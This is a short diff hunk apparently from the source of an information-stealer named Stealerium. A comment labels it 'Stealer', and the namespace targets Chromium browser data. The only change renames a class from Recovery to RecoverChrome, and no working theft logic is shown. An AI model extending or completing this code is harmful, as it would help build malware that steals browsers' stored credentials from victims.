@@ -209,7 +209,7 @@ namespace Stealerium.Target.Browsers.Chromium
     }
 
     // Stealer
-    internal sealed class Recovery
+    internal sealed class RecoverChrome
     {
         public static void Run(string sSavePath)
         {
